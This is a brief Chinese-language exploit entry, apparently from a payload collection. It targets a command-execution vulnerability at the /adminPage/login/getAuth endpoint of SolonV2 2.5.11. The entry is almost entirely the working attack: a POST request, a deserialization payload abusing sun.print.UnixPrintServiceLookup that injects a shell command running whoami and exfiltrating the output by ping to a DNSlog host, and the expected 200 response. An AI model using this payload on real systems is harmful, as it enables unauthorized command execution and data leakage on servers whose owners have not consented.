# SolonV2.5.11getAuth存在命令执行漏洞

SolonV2 ｜ 命令执行 ｜ —
- **请求**：`POST /adminPage/login/getAuth HTTP/1.1`

**Payload**
```
"name": {
"@type": "sun.print.UnixPrintServiceLookup",
"lpcFirstCom": \[
";ping -nc 2 `whoami`.${Dnslog}$;",
";ping -nc 2 `whoami`.${Dnslog}$;"
]
}
```
- **响应特征**：200 Dnslog回显